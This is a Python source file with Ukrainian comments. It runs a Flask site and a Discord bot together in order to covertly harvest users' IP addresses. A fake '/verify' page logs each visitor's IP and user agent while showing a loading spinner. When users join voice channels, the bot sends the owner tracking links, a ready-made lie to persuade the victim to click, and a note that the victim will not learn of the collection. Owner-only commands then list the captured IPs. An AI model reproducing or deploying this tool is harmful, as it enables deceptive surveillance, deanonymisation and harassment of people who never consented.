import discord
from discord.ext import commands
import json
import datetime
import os
import threading
from flask import Flask, request, jsonify, render_template_string

# ====== ВЕБ-СЕРВЕР ======
app = Flask(__name__)

# Словник для зберігання IP
user_ips = {}

@app.route('/')
def home():
    """Головна сторінка - виглядає як звичайний сайт"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Mossa Community</title>
        <style>
            body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
            .container { background: white; padding: 40px; border-radius: 20px; max-width: 600px; margin: 0 auto; }
            h1 { color: #5865F2; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎮 Mossa Community</h1>
            <p>Ласкаво просимо на наш сервер!</p>
            <p>Тут скоро буде щось цікаве...</p>
            <p style="color: gray; font-size: 12px;">v1.0</p>
        </div>
    </body>
    </html>
    """

@app.route('/verify/<user_id>')
def verify_user(user_id):
    """Непомітна сторінка - користувач думає що це верифікація"""
    
    # ЗБИРАЄМО IP НЕПОМІТНО
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    # Зберігаємо IP
    user_ips[user_id] = {
        "ip": ip,
        "time": datetime.datetime.now().isoformat(),
        "user_agent": request.headers.get('User-Agent', 'Unknown')
    }
    
    print(f"🕵️ Збережено IP для {user_id}: {ip}")
    
    # ПОКАЗУЄМО НЕВИННУ СТОРІНКУ
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Перевірка</title>
        <style>
            body { font-family: Arial; text-align: center; padding: 50px; background: #1a1a2e; }
            .container { background: #16213e; padding: 40px; border-radius: 20px; max-width: 500px; margin: 0 auto; border: 2px solid #0f3460; }
            h1 { color: #e94560; }
            p { color: #eee; }
            .spinner { 
                width: 50px; height: 50px; 
                border: 5px solid #333; 
                border-top: 5px solid #e94560; 
                border-radius: 50%; 
                animation: spin 1s linear infinite; 
                margin: 20px auto;
            }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="spinner"></div>
            <h1>⏳ Перевірка...</h1>
            <p>Будь ласка, зачекайте...</p>
            <p style="color: #666; font-size: 12px;">Це займе лише кілька секунд</p>
        </div>
        <script>
            // Через 3 секунди перенаправляємо на головну
            setTimeout(function() {
                window.location.href = '/';
            }, 3000);
        </script>
    </body>
    </html>
    """

@app.route('/api/ip/<user_id>')
def get_ip_api(user_id):
    """API для бота"""
    if user_id in user_ips:
        return jsonify({"status": "ok", "ip": user_ips[user_id]["ip"]})
    return jsonify({"status": "not_found"})

# ====== DISCORD БОТ ======
TOKEN = "ТВІЙ_ТОКЕН"
YOUR_USER_ID = ТВІЙ_ID
RENDER_URL = os.getenv('RENDER_URL', 'http://localhost:8080')

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'✅ Бот {bot.user} запущено!')
    print(f'📊 Підключено до {len(bot.guilds)} серверів')
    print(f'🔗 Веб-сервер: {RENDER_URL}')

@bot.event
async def on_voice_state_update(member, before, after):
    if before.channel is None and after.channel is not None:
        user_id = str(member.id)
        
        # Перевіряємо чи вже є IP
        if user_id in user_ips:
            ip = user_ips[user_id]["ip"]
            try:
                user = await bot.fetch_user(YOUR_USER_ID)
                embed = discord.Embed(
                    title="🕵️ IP отримано!",
                    description=f"**{member.name}** зайшов у голосовий канал",
                    color=discord.Color.green()
                )
                embed.add_field(name="👤 Користувач", value=member.name, inline=True)
                embed.add_field(name="🌐 IP", value=ip, inline=True)
                embed.add_field(name="🔊 Канал", value=after.channel.name, inline=True)
                embed.set_thumbnail(url=member.display_avatar.url)
                await user.send(embed=embed)
                print(f"📨 Відправлено IP для {member.name}: {ip}")
                return
            except:
                pass
        
        # Якщо IP немає - надсилаємо посилання (але виглядає як верифікація)
        tracking_link = f"{RENDER_URL}/verify/{user_id}"
        
        try:
            user = await bot.fetch_user(YOUR_USER_ID)
            embed = discord.Embed(
                title="🔍 НОВИЙ УЧАСНИК!",
                description=f"**{member.name}** приєднався до голосового каналу!",
                color=discord.Color.gold()
            )
            embed.add_field(name="👤 Ім'я", value=member.name, inline=True)
            embed.add_field(name="🆔 ID", value=member.id, inline=True)
            embed.add_field(name="🔊 Канал", value=after.channel.name, inline=True)
            embed.add_field(
                name="📌 Дія", 
                value=f"Попроси {member.name} **підтвердити вхід** за посиланням:",
                inline=False
            )
            embed.add_field(
                name="🔗 Посилання для підтвердження", 
                value=f"[Натисни для підтвердження]({tracking_link})",
                inline=False
            )
            embed.add_field(
                name="💡 Пояснення для користувача", 
                value="Скажи йому: 'Це потрібно для налаштування голосового чату, просто натисни'",
                inline=False
            )
            embed.set_thumbnail(url=member.display_avatar.url)
            embed.set_footer(text="Користувач не дізнається про збір IP")
            
            await user.send(embed=embed)
            print(f"📨 Відправлено посилання для {member.name}")
            
        except Exception as e:
            print(f"❌ Помилка: {e}")

@bot.command(name='ip')
async def get_ip(ctx, user: discord.Member = None):
    """Отримати IP користувача (тільки власник)"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Тільки для власника!")
        return
    
    if user is None:
        user = ctx.author
    
    user_id = str(user.id)
    if user_id in user_ips:
        ip_data = user_ips[user_id]
        embed = discord.Embed(
            title="🕵️ IP користувача",
            color=discord.Color.blue()
        )
        embed.add_field(name="👤 Користувач", value=user.name, inline=True)
        embed.add_field(name="🌐 IP", value=ip_data["ip"], inline=True)
        embed.add_field(name="📅 Час", value=ip_data["time"][:16], inline=True)
        await ctx.send(embed=embed)
    else:
        tracking_link = f"{RENDER_URL}/verify/{user_id}"
        embed = discord.Embed(
            title="❌ IP не знайдено",
            description=f"Користувач **{user.name}** ще не підтвердив вхід",
            color=discord.Color.red()
        )
        embed.add_field(
            name="🔗 Посилання для підтвердження", 
            value=f"[Натисни тут]({tracking_link})",
            inline=False
        )
        await ctx.send(embed=embed)

@bot.command(name='ips')
async def list_ips(ctx):
    """Показати всі зібрані IP"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Тільки для власника!")
        return
    
    if not user_ips:
        await ctx.send("📊 Немає зібраних IP")
        return
    
    embed = discord.Embed(
        title="📊 Зібрані IP",
        color=discord.Color.green()
    )
    
    desc = ""
    for uid, data in list(user_ips.items())[:10]:
        desc += f"**ID:** {uid}\n🌐 {data['ip']}\n📅 {data['time'][:16]}\n\n"
    
    embed.description = desc[:4096]
    await ctx.send(embed=embed)

@bot.command(name='clear_ips')
async def clear_ips(ctx):
    """Очистити IP"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Тільки для власника!")
        return
    
    user_ips.clear()
    await ctx.send("✅ Всі IP очищено!")

# ====== ЗАПУСК ======
def run_web_server():
    port = int(os.getenv('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

if __name__ == "__main__":
    if not TOKEN or TOKEN == "ТВІЙ_ТОКЕН":
        print("❌ ПОМИЛКА: Встав токен!")
        exit(1)
    
    # Запускаємо веб-сервер
    web_thread = threading.Thread(target=run_web_server)
    web_thread.daemon = True
    web_thread.start()
    print("🚀 Веб-сервер запущено!")
    
    # Запускаємо бота
    bot.run(TOKEN)
